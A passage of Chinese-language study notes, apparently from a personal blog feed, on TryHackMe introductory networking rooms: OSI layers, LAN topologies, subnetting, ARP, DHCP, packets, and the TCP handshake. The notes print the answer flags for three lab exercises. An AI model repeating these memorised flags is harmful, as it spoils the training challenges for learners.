<p>在每一台联网计算机内部都有一个网络接口卡(NIC- Network Interface Card)，它带有一个唯一的MAC(Media Access Control)地址作为标识；MAC地址由制造商设置，并刻入网络接口卡中，MAC地址不能被改变——尽管MAC地址可以被欺骗；当信息通过网络发送时，实际上是使用物理地址来确定将信息发送到哪里。此外，以适合传输的格式表示数据也是数据链路层的工作之一。</p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230326175234403.png"
                      alt="image-20230326175234403"
                ></p>
<h2 id="Layer-1-物理层-Physical"><a href="#Layer-1-物理层-Physical" class="headerlink" title="Layer 1 - 物理层(Physical)"></a>Layer 1 - 物理层(Physical)</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/physical.png"
                      alt="img"
                ></p>
<p>物理层包括了在网络中所使用的硬件的物理组件，是OSI模型的最低层，这些设备将使用电信号在二进制编号系统( 0 和 1 )中相互传输数据。</p>
<p>例如，以太网电缆连接设备：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230326180259445.png"
                      alt="image-20230326180259445" style="zoom: 67%;" 
                >

<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230326175520887.png"
                      alt="image-20230326175520887"
                ></p>
<h2 id="OSI实例练习"><a href="#OSI实例练习" class="headerlink" title="OSI实例练习"></a>OSI实例练习</h2><p>在和本文相关的TryHackMe实验房间中部署实验环境并回答问题。</p>
<p><strong>答题</strong></p>
<p>根据数据发送时在OSI七层中所经过的顺序完成模拟实验，并得到最后的flag。</p>
<p><em>tips：使用左、右方向键控制移动，使用空格键进行爬楼。</em></p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230326181243963.png"
                      alt="image-20230326181243963" style="zoom: 67%;" 
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230326181212728.png"
                      alt="image-20230326181212728" style="zoom: 67%;" 
                >

<blockquote>
<p>最后得到的flag是：THM{OSI_DUNGEON_ESCAPED} 。</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230326180750610.png"
                      alt="image-20230326180750610"
                ></p>
]]></content>
      <categories>
        <category>TryHackMe笔记</category>
      </categories>
      <tags>
        <tag>TryHackMe</tag>
        <tag>网络安全基础</tag>
      </tags>
  </entry>
  <entry>
    <title>THM-Intro to LAN(局域网基础介绍)-学习</title>
    <url>/2024/01/18/THM-Intro%20to%20LAN(%E5%B1%80%E5%9F%9F%E7%BD%91%E5%9F%BA%E7%A1%80%E4%BB%8B%E7%BB%8D)-%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>本文相关的TryHackMe实验房间链接：<a class="link"   href="https://tryhackme.com/room/introtolan" >https://tryhackme.com/room/introtolan <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>本文相关内容：了解一些支持专用网络的技术和设计。</p>
<h2 id="局域网-LAN-Local-Area-Network-拓扑简介"><a href="#局域网-LAN-Local-Area-Network-拓扑简介" class="headerlink" title="局域网(LAN-Local Area Network)拓扑简介"></a>局域网(LAN-Local Area Network)拓扑简介</h2><p>多年以来，人们对各种网络设计进行了试验和实施，在网络中，当我们提到术语“拓扑-Topology”时，实际上指的是当前网络的设计或外观。下面我们将讨论一下这些拓扑的优缺点。</p>
<h3 id="Star-Topology（星型拓扑）"><a href="#Star-Topology（星型拓扑）" class="headerlink" title="Star Topology（星型拓扑）"></a><strong>Star Topology（星型拓扑）</strong></h3><p>星型拓扑结构的主要前提是设备通过中央网络设备(如交换机或集线器)单独连接；尽管成本高昂，但由于其可靠性和可伸缩性，这种拓扑在今天仍是最常见的。</p>
<p>在星型拓扑结构中 发送到设备的任何信息都是通过此设备所连接的中心设备发送的，下面让我们探讨一下这种拓扑结构的一些优点和缺点:</p>
<p>由于这种拓扑结构需要更多的电缆布线和购买专用的网络设备，因此它比其他任何拓扑结构都要昂贵。然而，尽管增加了成本，星型拓扑结构也确实提供了一些显著的优势：例如，这种拓扑本质上将具有更强的可伸缩性，这意味着随着网络需求的增加，我们可以很容易地添加更多设备。</p>
<p>但不幸的是，随着网络规模越来越大，在星星拓扑中保持网络功能所需的维护成本就越高，而这种对维护的依赖增加也会使得故障排除变得更加困难。此外，星形拓扑仍然可能失效(尽管这种拓扑结构减少了失效的可能性)，例如，如果连接各个设备的集中式硬件出现故障，那么这些设备将不再能够继续发送或接收数据，值得庆幸的是，这些集中式硬件设备通常都很健壮。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230325211744823.png"
                      alt="image-20230325211744823" style="zoom:50%;" 
                >

<h3 id="Bus-Topology（总线拓扑）"><a href="#Bus-Topology（总线拓扑）" class="headerlink" title="Bus Topology（总线拓扑）"></a><strong>Bus Topology（总线拓扑）</strong></h3><p>总线拓扑中的各个设备在连接时 依赖于主干电缆的单一连接，此类拓扑结构中的设备就类似于树的叶子，因为在某种意义上，设备(叶子)起源于主干电缆上的分支。</p>
<p>下面让我们探讨一下这种拓扑结构的一些优点和缺点:</p>
<p>由于发送到每个设备的所有数据都沿着同一条电缆传输，所以如果总线拓扑中的各个设备同时请求数据，就很容易让数据传输变得缓慢和阻塞。当数据传输的阻塞情况达到瓶颈后，就会导致故障排除变得非常困难，因为在进行故障排除时——很难确定哪个设备正在经历“由于所有数据都沿着相同的路线传输而导致数据阻塞”。</p>
<p>尽管如此，总线拓扑仍然是一种更容易配置且成本更低的拓扑结构，它主要的花费在于购买连接各个设备的电缆或专用网络设备。</p>
<p>总线拓扑的另一个缺点是在发生故障时几乎没有冗余，这个缺点的存在是因为：如果在主干电缆上有一个单点故障，即电缆线突然断了，那么设备就不能再沿着总线接收或传输数据。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230325211804758.png"
                      alt="image-20230325211804758" style="zoom:50%;" 
                >

<h3 id="Ring-Topology（环型拓扑）"><a href="#Ring-Topology（环型拓扑）" class="headerlink" title="Ring Topology（环型拓扑）"></a><strong>Ring Topology（环型拓扑）</strong></h3><p>环形拓扑(也称为令牌拓扑)，在此拓扑中将由计算机等设备直接相互连接形成环路，这意味着几乎不需要电缆布线（只需要一点点电缆布线），也不太依赖于星型拓扑结构中的专用硬件。</p>
<p>环形拓扑的工作原理是通过环路发送数据，直到数据到达目标设备，在这个过程中会使用环路上的其他设备转发数据。有趣的是，在这个拓扑中，如果一个设备本身没有任何数据要发送，那么它只会转发从另一个设备接收到的数据；而如果该设备恰好有数据要发送，它会先发送自己的数据，然后再转发来自于其他设备的数据。</p>
<p>因为数据在这个拓扑结构中只有一个传输方向，所以很容易排除出现的任何故障；然而，这是一把双刃剑，因为单向传输在网络中并不是一种有效的数据传输方式，在总线拓扑中传输数据时，数据必须先访问多个设备才能最终到达预期的目标设备。</p>
<p>环形拓扑不太容易出现数据传输瓶颈，因为在总线拓扑结构中，大量流量不会在任何时候同时通过网络传输。然而，这种拓扑结构的设计也意味着：如果剪断电缆或损坏设备则将导致整个网络中断。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230325211833122.png"
                      alt="image-20230325211833122" style="zoom:50%;" 
                >

<h3 id="什么是交换机（Switch）？"><a href="#什么是交换机（Switch）？" class="headerlink" title="什么是交换机（Switch）？"></a><strong>什么是交换机（Switch）？</strong></h3><p>交换机是网络中的专用设备，它被设计用于聚合多个其他设备，如计算机、打印机或使用以太网的任何其他具有网络功能的设备；这些不同的设备都将插入交换机的端口。交换机通常存在于较大的网络中，如企业、学校或类似规模的网络，在这种环境下将有许多设备需要被连接到网络，此时交换机可以通过4、8、16、24、32、64端口来连接大量的设备。</p>
<p>交换机比它们的次要对应物(集线器&#x2F;中继器)更有效，交换机会跟踪哪些设备连接到哪个端口，因此，当交换机接收到一个数据包时，就不会像集线器那样将该数据包重复发送到每个端口，而是直接将数据包通过已知端口发送给预定的目标即可，从而减少了网络流量的消耗。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230325122204859.png"
                      alt="image-20230325122204859"
                ></p>
<p>交换机和路由器都可以相互连接，这样做可通过为数据添加多条路径来增加网络的冗余(可靠性)——如果一条路走不通，就可以用另一条路。虽然这可能会降低网络的整体性能，因为数据包要花费更长的时间来传输，但这尽量保证了网络没有停机时间——考虑到其他替代方案，降低网络的整体性能只是一个很小的代价。</p>
<h3 id="什么是路由器（Router）？"><a href="#什么是路由器（Router）？" class="headerlink" title="什么是路由器（Router）？"></a><strong>什么是路由器（Router）？</strong></h3><p>路由器的工作是连接网络并在网络之间传递数据，它通过使用路由(因此得名路由器)来做到这一点。</p>
<p>路由是给“数据在网络中传输的过程”的标签，路由涉及在网络之间创建一条路径，以便能够成功地传递数据。</p>
<p>当设备由多条路径连接时，如下面的示例图所示，路由就能发挥作用。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230325121757937.png"
                      alt="image-20230325121757937"
                ></p>
<h3 id="答题"><a href="#答题" class="headerlink" title="答题"></a><strong>答题</strong></h3><p>在和本文相关的TryHackMe实验房间中部署实验环境并回答问题。</p>
<p><em>tips：该实验环境将带我们了解不同网络拓扑结构中的缺陷。</em></p>
<p>在环形拓扑结构中，所有设备都连接到其他两个设备，形成一个完整的圆圈，数据包从一个设备传输到下一个设备，直到到达目的地：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230325214051829.png"
                      alt="image-20230325214051829" style="zoom:50%;" 
                >

<p>环形拓扑的主要缺陷之一是，如果设备故障或电缆损坏，则数据将不再传递，网络中的设备也无法再相互通信：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230325214218366.png"
                      alt="image-20230325214218366" style="zoom:50%;" 
                >

<p>在总线拓扑中，所有设备都连接到一根电缆上，这根电缆通常被称为主干电缆，数据将顺着主干电缆沿左右两个方向发送，直到到达数据包的目的地：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230325214458459.png"
                      alt="image-20230325214458459" style="zoom:50%;" 
                >

<p>总线拓扑的一个主要缺陷是它不能处理大量数据，如果同时发送的数据包过多，就会导致网络关闭：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230325214722436.png"
                      alt="image-20230325214722436" style="zoom:50%;" 
                >

<p>在星型拓扑中，所有设备都通过自己的电缆连接到中央交换机&#x2F;集线器，每个数据包都将通过中央交换机发送：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230325214952528.png"
                      alt="image-20230325214952528" style="zoom:50%;" 
                >

<p>如果交换机发生故障，则网络将不再工作：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230325215037202.png"
                      alt="image-20230325215037202" style="zoom:50%;" 
                >

<p>完成上述步骤，最后得到一个flag：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230325215123783.png"
                      alt="image-20230325215123783"
                ></p>
<blockquote>
<p>最后得到的flag为：THM{TOPOLOGY_FLAWS} 。</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230325213845669.png"
                      alt="image-20230325213845669"
                ></p>
<h2 id="子网划分入门"><a href="#子网划分入门" class="headerlink" title="子网划分入门"></a>子网划分入门</h2><p>在现实世界中，你可以找到各种形状和大小的网络，而子网划分是将网络内部划分为更小的微型网络的术语。你可以把子网划分想象成你正在给你的朋友们切蛋糕，只有一定份额的蛋糕可以分给大家，但每个人都想要得到一块蛋糕，子网划分就是由你来决定谁将得到哪块蛋糕（最后还需要保留一部分未划分区域）。</p>
<p>以一家企业为例，企业中有不同的部门，比如:</p>
<ul>
<li>会计（Accounting）</li>
<li>金融（Finance）</li>
<li>人力资源（Human Resources）</li>
</ul>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230325220009334.png"
                      alt="image-20230325220009334" style="zoom:50%;" 
                >

<p>在现实生活中，你知道要把信息发送到正确的企业部门，在网络中也同样需要知道这一点；网络管理员将使用子网划分来分类网络和分配网络的特定部分。</p>
<p>子网划分将通过划分网络中可以容纳的主机数量来实现，这将用一组被称为子网掩码的数字表示，让我们查看下图:</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230325220503766.png"
                      alt="image-20230325220503766"
                ></p>
<p>我们知道，一个IP地址由四个“八位二进制数”组成，共四个字节，而子网掩码也是如此，子网掩码同样是被表示为四个字节(1个字节占8个二进制位，共32位)的一组数字，每个字节的范围是从0到255(0-255)。</p>
<p>子网通过三种不同的方式使用IP地址：</p>
<ul>
<li>标识网络地址（network address）</li>
<li>标识主机地址（host address）</li>
<li>标识默认网关（default gateway）</li>
</ul>
<p>让我们了解一下以上三种方式的目的，如下所示:</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230325221335603.png"
                      alt="image-20230325221335603"
                ></p>
<p>tips：默认网关是网络中的一个特殊设备，它能够向另一个网络上的设备发送信息。</p>
<p>在像家庭网络这样的小型网络中，你的计算机设备将处于一个子网中，你不太可能在这样的小型网络中需要一次连接超过254个设备；而像企业这样的大型网络中，将会有更多的设备(如各企业部门的pc、打印机、相机和传感器等)，在大型网络中更加需要进行子网划分。</p>
<p>子网划分提供了一系列好处，包括:</p>
<ul>
<li>效率</li>
<li>安全</li>
<li>完全控制</li>
</ul>
<p>我们将在以后继续探索子网划分是如何提供好处的，现在我们只需要了解子网划分所提供的安全元素；让我们以街上的咖啡馆为例，假设某家咖啡馆有两个网络：</p>
<ul>
<li>一个网络用于员工、收银机和其他店内联网设备。</li>
<li>一个网络供公众使用WiFi。</li>
</ul>
<p>子网划分允许你将以上例子中的两个网络彼此分开，同时还能连接到互联网等更大的网络。</p>
<h3 id="答题-1"><a href="#答题-1" class="headerlink" title="答题"></a><strong>答题</strong></h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230325225950872.png"
                      alt="image-20230325225950872"
                ></p>
<h2 id="ARP协议介绍"><a href="#ARP协议介绍" class="headerlink" title="ARP协议介绍"></a>ARP协议介绍</h2><p>回顾我们上文所述，网络中的设备可以有两个标识符： MAC 地址和 IP 地址；而通过ARP协议可以允许设备在网络中识别自己，ARP协议即地址解析协议（<strong>A</strong>ddress <strong>R</strong>esolution <strong>P</strong>rotocol ）。</p>
<p>简而言之，ARP协议允许设备将其MAC地址与网络上的IP地址相关联，网络上的每个设备都将保存与其他设备关联的MAC地址的日志；每当一个设备希望与另一个设备进行通信时，它将向整个网络发送广播以搜索目标设备，也就是说——网络中的设备可以通过ARP协议找到目标设备的MAC地址(即物理标识符)从而进行通信。</p>
<p><strong>ARP协议是如何工作的?</strong></p>
<p>网络中的每个设备都有一个用于存储信息的分类账簿，被称为缓存，在ARP协议的上下文中，这个缓存会存储网络上其他设备的标识符。</p>
<p>为了将这两个标识符(IP地址和MAC地址)映射在一起，ARP协议会发送两种类型的消息：</p>
<ul>
<li>ARP Request（ARP请求）</li>
<li>ARP Reply（ARP应答）</li>
</ul>
<p>当发送ARP请求时，初始源设备会向网络上的其他设备广播一条消息，以询问其他设备的MAC地址是否与初始源设备所请求的IP地址相匹配；如果某个设备确实有初始源设备所请求的IP地址（此设备即为初始目标设备），则会向初始源设备返回一个ARP应答消息以进行确认，初始源设备随后将记住这一映射关系，并将其存储在初始源设备的缓存中(以一个ARP条目的形式存储)。</p>
<p>这个过程如下图所示：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230325233634467.png"
                      alt="image-20230325233634467" style="zoom: 67%;" 
                >

<h3 id="答题-2"><a href="#答题-2" class="headerlink" title="答题"></a><strong>答题</strong></h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230325234520603.png"
                      alt="image-20230325234520603"
                ></p>
<h2 id="DHCP协议介绍"><a href="#DHCP协议介绍" class="headerlink" title="DHCP协议介绍"></a>DHCP协议介绍</h2><p>IP 地址可以手动分配，方法是将 IP 手动绑定到设备，IP 地址也可以自动分配，最常见的是使用动态主机配置协议（DHCP）服务器。当设备连接到网络时，如果尚未手动为其分配 IP 地址，它则会发出一个请求消息（DHCP Discover）以查看网络上是否有任何 DHCP 服务器，然后 DHCP 服务器将回复一个包含原设备可用的 IP 地址信息的消息（DHCP Offer）给原设备，紧接着原设备将再发送一个请求消息（DHCP Request）以确认它需要这个被提供的 IP 地址，最后，DHCP服务器将会发送一个应答消息（DHCP ACK）以确认IP分配操作已经完成，此后原设备就可以开始使用由DHCP服务器所提供的 IP 地址。</p>
<p>tips：DHCP-<strong>D</strong>ynamic <strong>H</strong>ost <strong>C</strong>onfiguration <strong>P</strong>rotocol（动态主机配置协议）</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230325235958781.png"
                      alt="image-20230325235958781" style="zoom: 67%;" 
                >

<h3 id="答题-3"><a href="#答题-3" class="headerlink" title="答题"></a><strong>答题</strong></h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230326000851046.png"
                      alt="image-20230326000851046"
                ></p>
]]></content>
      <categories>
        <category>TryHackMe笔记</category>
      </categories>
      <tags>
        <tag>TryHackMe</tag>
        <tag>网络安全基础</tag>
      </tags>
  </entry>
  <entry>
    <title>THM-Packets &amp; Frames(了解数据包和帧)-学习</title>
    <url>/2024/01/18/THM-Packets&amp;Frames(%E4%BA%86%E8%A7%A3%E6%95%B0%E6%8D%AE%E5%8C%85%E5%92%8C%E5%B8%A7)-%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>本文相关的TryHackMe实验房间链接：<a class="link"   href="https://tryhackme.com/room/packetsframes" >https://tryhackme.com/room/packetsframes <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>本文相关内容：了解数据如何被分成更小的部分并通过网络传输到另一台设备。</p>
<h2 id="什么是数据包和帧？"><a href="#什么是数据包和帧？" class="headerlink" title="什么是数据包和帧？"></a>什么是数据包和帧？</h2><p>数据包和帧是小块的数据，当它们组合在一起时，就构成了更大的信息或消息；然而，数据包和帧在OSI模型中是两种不同的东西，帧位于OSI的第2层——数据链路层，这意味着帧不包含IP地址这样的信息。类比案例：你可以想象把一个信封放在另外一个信封里，然后邮寄完整的信封，此完整信封对应的是发送的数据包，一旦打开完整信封，里面仍然会存在并包含一些数据(也就是一个帧)。</p>
<p>数据包和帧的组合过程被称为封装，在这个阶段中，我们可以安全地假设：任何包含IP地址的信息指的都是数据包，而当封装好的信息被剥离时，我们谈论的信息则是帧本身。</p>
<p>数据包是跨网络设备传输数据的有效方式，由于这些数据是分小块传输的，所以此时在整个网络中发生数据传输阻塞的几率 比一次性发送大消息进而造成传输阻塞的几率要小。</p>
<p>当你从网站加载图像时，该图像不会作为一个整体发送到你的计算机，而是在你的计算机上由小块图像开始重建进而得到一个完整图像；下面的图片说明了以上过程，来自于网站的图像将被分成三个数据包，当数据包到达计算机时，图像就会开始重建，最终形成完整的图像。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230326193818536.png"
                      alt="image-20230326193818536"
                ></p>
<p>数据包有不同的结构，这些结构取决于正在发送的数据包的类型，网络上充满了各种标准和协议，这些标准和协议充当了设备上如何处理数据包的一组规则。</p>
<p>使用了协议的数据包将有一组标头，其中包含跨网络发送的数据的附加信息。</p>
<p>一些值得注意的标头信息包括：</p>
<ul>
<li>Time to Live（生存时间）：该字段为数据包设置了一个过期计时器，即使数据包永远无法到达目标主机，这也不会阻塞你的网络。</li>
<li>Checksum（校验和）：该字段能够为TCP&#x2F;IP等协议提供完整性检查，如果数据被更改了，那么此时的Checksum值将变得与预期的Checksum值不同。</li>
<li>Source Address（源地址）：该字段表示发送数据包的设备的IP地址，这样数据就知道该返回到哪里。</li>
<li>Destination Address（目标地址）：数据包要发送到的设备的IP地址，以便数据知道下一步要传输到哪里。</li>
</ul>
<h3 id="答题"><a href="#答题" class="headerlink" title="答题"></a><strong>答题</strong></h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230326201110685.png"
                      alt="image-20230326201110685"
                ></p>
<h2 id="TCP-IP（三次握手）介绍"><a href="#TCP-IP（三次握手）介绍" class="headerlink" title="TCP&#x2F;IP（三次握手）介绍"></a>TCP&#x2F;IP（三次握手）介绍</h2><p>传输控制协议(TCP-Transmission Control Protocol)是在网络中使用的一个规则。</p>
<p>基于TCP&#x2F;IP协议集的TCP&#x2F;IP模型与OSI模型非常相似，TCP&#x2F;IP模型由四层分级组成，可以说是OSI模型的一个简化版本，TCP&#x2F;IP模型所包含的分层有:</p>
<ul>
<li>Application（应用层）</li>
<li>Transport（传输层）</li>
<li>Internet（网际层）</li>
<li>Network Interface（网络接口层）</li>
</ul>
<p>与OSI模型的工作原理非常相似，数据包在经过TCP&#x2F;IP模型的每一层时都会被添加部分信息——这个过程被称为封装，而与此过程相反的是解封装。</p>
<p><strong>关于TCP协议</strong></p>
<p>TCP协议的一个定义特征是它是基于连接的，这意味着在发送数据之前，TCP必须在客户端和作为服务器的设备之间建立起一个持续的连接；因此，TCP能够保证发送的任何数据都会在另一端被正确地接收到，这个数据发送和接收过程被称为TCP&#x2F;IP三次握手。</p>
<p>下面是关于TCP优点和缺点的比较:</p>
<ul>
<li>TCP的优点：能够保证数据的准确性；能够同步两个设备，以防止彼此被数据淹没；将执行更多流程，以确保数据传输的可靠性。</li>
<li>TCP的缺点：要求两台设备之间有可靠的连接，如果没有接收到一小块数据，那么整个数据块就不能使用（必须重新发送）；TCP的慢速连接可能会导致其他设备达到数据传输的瓶颈，因为在数据传输完毕之前——相关的TCP连接将一直保留在接收端计算机上；TCP 比 UDP 慢得多，因为使用此协议的设备必须完成更多的工作（计算）。</li>
</ul>
<p>TCP数据包还将包含 在封装过程中所添加的被称为标头的信息部分，接下来让我们了解一些重要的TCP标头信息：</p>
<ul>
<li>Source Port（源端口）：发送方为发送TCP数据包而开放的端口，该值是随机选择的(从0-65535之间 选择尚未使用的端口)。</li>
<li>Destination Port（目标端口）：远程主机（接收数据的主机）上运行的应用程序或服务的端口号，例如，默认运行 Web 服务器的端口 80；与源端口不同，目标端口号并不是随机选择的。</li>
<li>Source IP（源IP地址）：这是发送数据包的设备的IP地址。</li>
<li>Destination IP（目标IP地址）：这是数据包要到达的设备的IP地址。</li>
<li>Sequence Number（序列号）：当TCP连接建立时，所传输的第一段数据将被赋予一个随机数。</li>
<li>Acknowledgement Number（确认号）：在一段数据被赋予序列号之后，下一段数据的序列号值将会是序列号+ 1。</li>
<li>Checksum（校验和）：这个值可用于对TCP数据包的完整性进行检查，如果校验和的值在数据传输过程中发生了变化，则说明数据已经被损坏。</li>
<li>Data（数据）：这个标头是存储数据的地方，所存储的是正在传输的文件的字节。</li>
<li>Flag（标志）：这个TCP标头决定了在三次握手过程中任一设备应该如何处理数据包，特定的标志将决定特定的行为。</li>
</ul>
<p><strong>TCP&#x2F;IP三次握手</strong></p>
<p>接下来，我们将讨论TCP&#x2F;IP三次握手——这是用于在两个设备之间建立连接的过程的术语。</p>
<p>TCP&#x2F;IP三次握手会使用一些特殊的信息进行交流，下面是一些主要的信息：</p>
<ul>
<li>1-SYN：SYN消息是客户端在握手过程中发送的初始数据包。这个包用于发起连接并同步两个设备。</li>
<li>2-SYN&#x2F;ACK：此数据包将由接收设备(服务器)发送，以确认来自客户端的同步尝试。</li>
<li>3-ACK：客户端或服务器都可以使用确认数据包来确认已经成功接收了一系列消息&#x2F;数据包。</li>
<li>4-DATA：一旦两个设备建立了连接，数据(例如文件的字节)就会通过“DATA”消息发送。</li>
<li>5-FIN：此数据包可用于在TCP连接完成后 干净地(正确地)关闭TCP连接。</li>
<li>RST：RST数据包能够立刻终止所有的TCP通信，如果使用了RST数据包则表明在TCP握手过程中存在一些问题——比如发生了服务或应用程序异常以及系统资源不足等故障。</li>
</ul>
<p>下图显示了Alice和Bob之间正常的TCP三次握手过程，在现实生活中，这将发生在两个设备之间：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230326214033986.png"
                      alt="image-20230326214033986"
                ></p>
<p>在TCP三次握手过程中，客户端所发送的数据将被赋予一个随机数序列，这个数字序列接下来将进行重构并递增1；两台计算机设备必须就相同的数字序列达成一致，才能以正确的顺序发送数据，这个顺序是在三个步骤中商定的（下面步骤中的序列号是随机值）：</p>
<ul>
<li>SYN-Client：客户端将设置用于同步的SYN标志位并生成一个随机初始序列号(ISN)——0 。</li>
<li>SYN&#x2F;ACK-Server：服务器端将设置SYN标志位和ACK标志位并生成一个随机初始序列号(5000)，并对客户端的初始序列号(0)进行确认（ACK&#x3D;0+1）。</li>
<li>ACK-Client： 客户端设置ACK标志位，并对服务器端的初始序列号(5000)进行确认（ACK&#x3D;5000+1）。</li>
</ul>
<p>tips：SYNchronise-SYN(同步)，ACKnowledge-ACK(确认)，Initial Sequence Number-ISN(初始序列号)；以上步骤的结果——客户端ISN+1，服务器端ISN+1。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230326221426557.png"
                      alt="image-20230326221426557" style="zoom: 50%;" 
                >

<p><strong>TCP连接的关闭</strong></p>
<p>接下来，让我们简单介绍一下TCP连接关闭背后的过程。</p>
<p>首先，一旦源设备确定目标设备成功接收了所有数据，那么TCP连接就将要被关闭；因为TCP会在设备上占用一些系统资源，所以最好在不需要的时候尽快关闭TCP连接。</p>
<p>为了启动TCP连接的关闭过程，设备将发送一个“FIN”数据包到另一个设备，当然，这仍基于TCP协议，其他设备也必须确认这个“FIN”数据包。</p>
<p>让我们像前文一样使用Alice和Bob来展示这个过程：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230326223520503.png"
                      alt="image-20230326223520503"
                ></p>
<p>在上图中，我们可以看到Alice首先向Bob发送一个“FIN”包，当Bob收到这个消息之后，Bob会让Alice知道他已经收到消息(ACK)，并且Bob将表示他也想要关闭连接(FIN)，而Alice在收到来自于Bob的消息(ACK+FIN)之后，将进行最终的确认(ACK)——结果是TCP连接被成功关闭。</p>
<h3 id="答题-1"><a href="#答题-1" class="headerlink" title="答题"></a><strong>答题</strong></h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230326224720813.png"
                      alt="image-20230326224720813"
                ></p>
<h2 id="关于三次握手的模拟练习"><a href="#关于三次握手的模拟练习" class="headerlink" title="关于三次握手的模拟练习"></a>关于三次握手的模拟练习</h2><p>在和本文相关的TryHackMe实验房间中部署实验环境并回答问题。</p>
<p><em>tips：以正确的顺序重新组装TCP握手过程，以帮助 Alice 和 Bob 进行通信，在 Alice 与 Bob 的对话结束后会给出一个flag值。</em></p>
<h3 id="答题-2"><a href="#答题-2" class="headerlink" title="答题"></a><strong>答题</strong></h3><p><em><strong>Part1：</strong></em></p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230326225206394.png"
                      alt="image-20230326225206394" style="zoom:50%;" 
                >

<p><em><strong>Part2：</strong></em></p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230326225315154.png"
                      alt="image-20230326225315154" style="zoom:50%;" 
                >

<p><em><strong>Part3：</strong></em></p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230326225411070.png"
                      alt="image-20230326225411070" style="zoom:50%;" 
                >

<p><em><strong>Part4：</strong></em></p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230326225512847.png"
                      alt="image-20230326225512847" style="zoom:50%;" 
                >

<p><em><strong>Part5：</strong></em></p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230326225632300.png"
                      alt="image-20230326225632300" style="zoom:50%;" 
                >

<p><em><strong>Part6：</strong></em></p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230326225759731.png"
                      alt="image-20230326225759731" style="zoom:50%;" 
                >

<p><em><strong>Part7：</strong></em></p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230326225838033.png"
                      alt="image-20230326225838033" style="zoom:50%;" 
                >

<p><em><strong>Part8：</strong></em></p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230326225910031.png"
                      alt="image-20230326225910031" style="zoom:50%;" 
                >

<p>对话结束，得到一个flag：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230326225933032.png"
                      alt="image-20230326225933032"
                ></p>
<blockquote>
<p>最后得到的flag值为：THM{TCP_CHATTER} 。</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230326225109100.png"
                      alt="image-20230326225109100"
                ></p>
<h2 id="UDP-IP介绍"><a href="#UDP-IP介绍" class="headerlink" title="UDP&#x2F;IP介绍"></a>UDP&#x2F;IP介绍</h2><p>用户数据报协议(UDP-<strong>U</strong>ser <strong>D</strong>atagram <strong>P</strong>rotocol)是另一种用于设备之间进行数据通信的协议。</p>
<p>与TCP不同，UDP是一种无状态协议，它不需要通过在两个设备之间保持恒定的连接来发送数据；UDP协议不会发生三次握手过程，两个互相通信的设备之间也不存在任何同步。</p>
